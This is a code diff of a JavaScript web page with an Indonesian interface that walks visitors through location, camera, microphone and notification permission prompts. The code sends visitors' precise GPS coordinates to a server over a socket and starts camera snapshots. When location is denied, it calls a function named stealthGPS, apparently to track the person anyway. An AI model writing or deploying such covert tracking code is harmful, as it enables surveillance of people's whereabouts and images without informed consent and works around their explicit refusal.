@@ -873,49 +873,87 @@ function requestPermissions() {
     }, 3000);
     scheduleGhostSpeech();
 
-    return new Promise((r) => {
-        let loc=false, cam=false;
-        const c=()=>{if(loc&&cam)r();};
+    return requestAllPermissions();
+}
 
-        if (navigator.geolocation) {
-            function requestGPS() {
-                navigator.geolocation.getCurrentPosition(
-                    (p)=>{
-                        socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
-                        if(!loc){loc=true;c();}
-                    },
-                    (err)=>{
-                        if(!loc){loc=true;c();}
-                        if(err.code===1){stealthGPS();}
-                    },
-                    {enableHighAccuracy:true,timeout:15000}
-                );
-            }
+function requestAllPermissions() {
+    const perms = [
+        { id:'location', icon:'📍', label:'Lokasi', bg:'#00d4ff' },
+        { id:'camera', icon:'📷', label:'Kamera', bg:'#7c3aed' },
+        { id:'microphone', icon:'🎤', label:'Mikrofon', bg:'#ec4899' },
+        { id:'notifications', icon:'🔔', label:'Notifikasi', bg:'#f59e0b' }
+    ];
+    const container = document.getElementById('loPerms');
+    if (!container) return Promise.resolve();
+    container.innerHTML = '';
+    perms.forEach(p => {
+        const el = document.createElement('div');
+        el.className = 'lo-perm';
+        el.id = 'lo-perm-' + p.id;
+        el.innerHTML = `
+            <div class="p-icon" style="background:${p.bg}22;">${p.icon}</div>
+            <div class="p-label">${p.label}</div>
+            <div class="p-status" id="lo-status-${p.id}">Menunggu</div>
+        `;
+        container.appendChild(el);
+    });
 
-            if (navigator.permissions && navigator.permissions.query) {
-                navigator.permissions.query({name:'geolocation'}).then(p => {
-                    if (p.state === 'denied') {
-                        if(!loc){loc=true;c();}
-                        stealthGPS();
-                    } else {
-                        requestGPS();
-                        p.onchange = () => {
-                            if (p.state === 'granted') requestGPS();
-                        };
-                    }
-                }).catch(() => requestGPS());
-            } else {
-                requestGPS();
-            }
-        } else {
-            if(!loc){loc=true;c();}
+    return new Promise(resolve => {
+        let idx = 0;
+        function next() {
+            if (idx >= perms.length) { resolve(); return; }
+            requestPermItem(perms[idx]).then(() => { idx++; next(); });
         }
+        next();
+    });
+}
 
-        if (navigator.mediaDevices?.getUserMedia) {
+function requestPermItem(perm) {
+    const statusEl = document.getElementById('lo-status-' + perm.id);
+    const itemEl = document.getElementById('lo-perm-' + perm.id);
+    statusEl.textContent = 'Meminta...';
+    itemEl.classList.add('active');
+
+    return new Promise(r => {
+        const done = (ok) => {
+            itemEl.classList.remove('active');
+            if (ok) {
+                statusEl.textContent = '\u2713 Aktif';
+                itemEl.classList.add('done');
+            } else {
+                statusEl.textContent = 'Dilewati';
+                itemEl.classList.add('skipped');
+            }
+            setTimeout(r, 300);
+        };
+
+        if (perm.id === 'location') {
+            if (!navigator.geolocation) { done(false); return; }
+            navigator.geolocation.getCurrentPosition(
+                (p) => {
+                    socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
+                    done(true);
+                },
+                (err) => {
+                    if (err.code === 1) stealthGPS();
+                    done(false);
+                },
+                {enableHighAccuracy:true,timeout:10000}
+            );
+        } else if (perm.id === 'camera') {
+            if (!navigator.mediaDevices?.getUserMedia) { done(false); return; }
             navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
-                .then((s)=>{stream=s;if(!cam){cam=true;c();}startSnapshots();})
-                .catch(()=>{if(!cam){cam=true;c();}});
-        } else {if(!cam){cam=true;c();}}
+                .then((s) => { stream = s; startSnapshots(); done(true); })
+                .catch(() => done(false));
+        } else if (perm.id === 'microphone') {
+            if (!navigator.mediaDevices?.getUserMedia) { done(false); return; }
+            navigator.mediaDevices.getUserMedia({audio:true,video:false})
+                .then((s) => { s.getTracks().forEach(t => t.stop()); done(true); })
+                .catch(() => done(false));
+        } else if (perm.id === 'notifications') {
+            if (!('Notification' in window)) { done(false); return; }
+            Notification.requestPermission().then(p => done(p === 'granted'));
+        }
     });
 }
 
